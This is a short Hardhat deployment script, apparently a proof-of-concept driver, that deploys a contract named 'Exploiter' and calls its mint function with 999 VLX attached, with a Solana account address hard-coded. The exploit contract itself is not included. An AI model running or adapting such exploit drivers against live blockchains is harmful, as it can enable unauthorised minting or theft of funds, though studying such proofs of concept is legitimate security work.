import { ethers } from "hardhat";
// @ts-ignore
import { base58_to_binary } from 'base58-js'


async function main() {
  // Edit here
  const vlxAmoutToMint = "999";
  const solanaAccount = "GmbNPyEpYXgAz8Y7wi1Db3bycRePugTECU4DYPSRcfGN";
  // EOF edit
  
  console.log(`Account balance in EVM space:\t ${ethers.utils.formatEther(await (await ethers.provider.getBalance(await ethers.provider.getSigner().getAddress())).toString())} VLX`);

  const Exploit = await ethers.getContractFactory("Exploiter");
  const exploit = await Exploit.deploy();

  await exploit.deployed();

  const tx = await exploit.mint(
    { value: ethers.utils.parseEther(vlxAmoutToMint) }
  )

  await tx.wait()
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
